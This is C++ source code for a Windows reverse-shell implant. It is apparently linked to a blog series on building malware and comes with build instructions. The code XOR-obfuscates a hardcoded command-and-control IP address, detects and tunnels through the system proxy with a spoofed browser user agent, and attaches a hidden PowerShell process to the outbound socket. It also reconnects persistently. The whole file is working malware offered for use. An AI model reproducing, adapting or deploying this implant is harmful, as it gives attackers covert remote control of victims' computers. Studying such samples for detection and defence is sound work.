//Author : Paranoid Ninja
//Email  : paranoidninja@protonmail.com
//Blog   : https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/

//Compile with g++/i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
//The effective size with statically compiled code should be around 13 Kb

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream>
#include <string>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <WinInet.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wininet.lib")

#define DEFAULT_BUFLEN 1024

typedef struct Proxy {
	char ip[17];
	int port;
} ProxyServer, * LPProxyServer;


bool GetSystemProxy(LPProxyServer proxy) {
	DWORD dw;
	char proxyOption[100] = { 0 };
	LPINTERNET_PROXY_INFO ProxyInfo;
	//ProxyServer proxy;
	std::string s, LocalProxyAddr, LocalProxyPortStr;
	size_t del;

	InternetQueryOption(NULL, INTERNET_OPTION_PROXY, proxyOption, &dw);
	ProxyInfo = (LPINTERNET_PROXY_INFO)proxyOption;
	if (ProxyInfo->lpszProxy) {
		printf("Proxy detected: %s\n", ProxyInfo->lpszProxy);
		s.assign((const char*)ProxyInfo->lpszProxy);
		del = s.find(":");
		LocalProxyAddr = s.substr(0, del);
		LocalProxyPortStr = s.substr(del + 1);
		strncpy_s(proxy->ip, LocalProxyAddr.c_str(), LocalProxyAddr.size());
		proxy->port = std::stoi(LocalProxyPortStr);
		return true;
	}

	return false;
}

void DecryptXOR(std::string C2Server, std::string& DecryptedC2Server) {
	size_t del;
	std::string C2 = C2Server;
	std::string s;
	char key;

	// in last iteration will get key which is in the last character (88)
	while ((del = C2.find(',')) != std::string::npos) {
		s = C2.substr(0, del);
		key = std::stoi(s);
		C2.erase(0, del + 1);
	}
	//std::cout << (size_t)key << " -> " << key << std::endl;

	// XOR decrypting
	C2 = C2Server;
	while ((del = C2.find(',')) != std::string::npos) {
		s = C2.substr(0, del);
		DecryptedC2Server += (char)(std::stoi(s) ^ key);
		C2.erase(0, del + 1);
	}
	//std::cout << DecryptedC2Server;
}

void RunShell(char* C2Server, int C2Port) {
	while (true) {
		Sleep(1000);    // 1000 = One Second

		SOCKET mySocket;
		sockaddr_in addr;
		WSADATA version;
		std::string SystemProxy;
		std::string LocalProxy, LocalProxyPortStr;
		char httpRequestFormat[3000];
		char httpConnect[3000];
		ProxyServer proxy;

		WSAStartup(MAKEWORD(2, 2), &version);
		mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		addr.sin_family = AF_INET;
		if (GetSystemProxy(&proxy)) {  // proxy detected
			if (!(inet_pton(AF_INET, proxy.ip, &addr.sin_addr))) {
				std::cout << "Error inet_pton()" << std::endl;
				return;
			}
			addr.sin_port = htons(proxy.port);
		}
		else {  // no proxy
			std::cout << "No proxy" << std::endl;
			addr.sin_addr.s_addr = inet_addr(C2Server);  //IP received from main function
			addr.sin_port = htons(C2Port);     //Port received from main function
		}

		//Connecting to Proxy/ProxyIP/C2Host
		if (WSAConnect(mySocket, (SOCKADDR*)& addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
			closesocket(mySocket);
			WSACleanup();
			continue;
		}
		else {
			// enviar http connect
			if (GetSystemProxy(&proxy)) {
				char httpConnect2[] = "CONNECT http://%s:%d HTTP/1.1\r\n"
					"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\r\n"
					"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,;q=0.8\r\n"
					"Accept-Language: en-US,en;q=0.5\r\n"
					"Accept-Encoding: gzip, deflate\r\n"
					"Upgrade-Insecure-Request    s: 0\r\n"
					"Connection: keep-alive\r\n"
					"Host: %s\r\n\r\n";
				snprintf(httpRequestFormat, sizeof(httpRequestFormat), httpConnect2, C2Server, 443, C2Server);
				strncpy_s(httpConnect, httpRequestFormat, sizeof(httpRequestFormat));
				send(mySocket, httpConnect, sizeof(httpConnect), 0);
			}

			char RecvData[DEFAULT_BUFLEN];
			memset(RecvData, 0, sizeof(RecvData));
			int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
			if (RecvCode <= 0) {
				closesocket(mySocket);
				WSACleanup();
				continue;
			}
			else {
				wchar_t Process[] = L"powershell.exe";
				STARTUPINFO sinfo;
				PROCESS_INFORMATION pinfo;
				memset(&sinfo, 0, sizeof(sinfo));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				sinfo.wShowWindow = SW_HIDE;
				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
				CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
				WaitForSingleObject(pinfo.hProcess, INFINITE);
				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);

				memset(RecvData, 0, sizeof(RecvData));
				int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
				if (RecvCode <= 0) {
					closesocket(mySocket);
					WSACleanup();
					continue;
				}

				if (strcmp(RecvData, "exit\n") == 0) {
					exit(0);
				}
			}
		}
	}
}

//-----------------------------------------------------------
//-----------------------------------------------------------
//-----------------------------------------------------------
int main(int argc, char** argv) {
	//char C2Server[] = "195.201.56.154";
	std::string C2Server("105,97,109,118,106,104,105,118,109,110,118,105,109,108,88,");	// 195.201.56.154
	std::string DecryptedC2Server;
	int C2Port = 443;


	//FreeConsole();
	DecryptXOR(C2Server, DecryptedC2Server);
	RunShell((char*)DecryptedC2Server.c_str(), C2Port);


	return 0;
}